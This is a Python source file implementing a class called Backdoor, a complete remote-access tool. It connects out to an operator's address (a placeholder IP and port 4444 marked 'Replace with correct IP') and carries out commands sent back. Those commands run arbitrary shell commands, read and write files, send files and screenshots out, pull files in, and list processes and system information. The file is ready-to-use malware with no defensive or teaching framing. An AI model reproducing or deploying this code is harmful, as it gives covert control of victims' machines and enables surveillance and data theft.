import socket
import subprocess
import os
import pyautogui
import psutil
import platform
import struct

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result.encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return file.read()
        except FileNotFoundError:
            return f"File {path} not found".encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(content)
            return f"File {path} written successfully".encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"Directory changed to {os.getcwd()}".encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()

    def upload_file(self, filename):
        try:
            with open(filename, 'rb') as file:
                data = file.read()
            size = struct.pack(">I", len(data))
            self.connection.sendall(size + data)
            return b"Upload successful"
        except Exception as e:
            return f"Upload failed: {str(e)}".encode()

    def download_file(self, filename):
        try:
            size_data = self.connection.recv(4)
            size = struct.unpack(">I", size_data)[0]
            data = b""
            while len(data) < size:
                chunk = self.connection.recv(4096)
                if not chunk:
                    break
                data += chunk
            with open(filename, 'wb') as file:
                file.write(data)
            return b"Download successful"
        except Exception as e:
            return f"Download failed: {str(e)}".encode()

    def capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
            with open("screenshot.png", "rb") as file:
                data = file.read()
            size = struct.pack(">I", len(data))
            self.connection.sendall(size + data)
            return b"Screenshot sent"
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}".encode()

    def list_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"{proc.info['pid']} - {proc.info['name']}")
        return "\n".join(processes).encode()

    def system_info(self):
        try:
            system = platform.system()
            if system == "Windows":
                os_info = subprocess.check_output("systeminfo", shell=True, text=True)
            else:
                os_info = subprocess.check_output("uname -a", shell=True, text=True)
            return os_info.encode()
        except Exception as e:
            return f"Error fetching system info: {str(e)}".encode()

    def handle_command(self, command):
        try:
            if command.startswith(b"system "):
                cmd = command.decode()[7:]
                result = self.execute_system_command(cmd)
            elif command.startswith(b"read "):
                path = command.decode()[5:]
                result = self.read_file(path)
            elif command.startswith(b"write "):
                parts = command.decode().split(" ", 2)
                if len(parts) < 3:
                    result = b"Usage: write <filename> <content>"
                else:
                    path, content = parts[1], parts[2].encode()
                    result = self.write_file(path, content)
            elif command.startswith(b"cd "):
                path = command.decode()[3:]
                result = self.change_directory(path)
            elif command.startswith(b"upload "):
                filename = command.decode()[7:]
                result = self.upload_file(filename)
            elif command.startswith(b"download "):
                filename = command.decode()[9:]
                result = self.download_file(filename)
            elif command == b"screenshot":
                result = self.capture_screenshot()
            elif command == b"processes":
                result = self.list_processes()
            elif command == b"info":
                result = self.system_info()
            elif command == b"exit":
                self.connection.close()
                exit(0)
            else:
                result = b"Unknown command"
            self.connection.sendall(result)
        except Exception as e:
            self.connection.sendall(f"Error: {str(e)}".encode())

    def run(self):
        while True:
            try:
                data = self.connection.recv(1024)
                if not data:
                    break
                self.handle_command(data)
            except Exception as e:
                self.connection.sendall(f"Connection error: {e}".encode())

# Usage
my_backdoor = Backdoor("127.0.0.1", 4444)  # Replace with correct IP
my_backdoor.run()
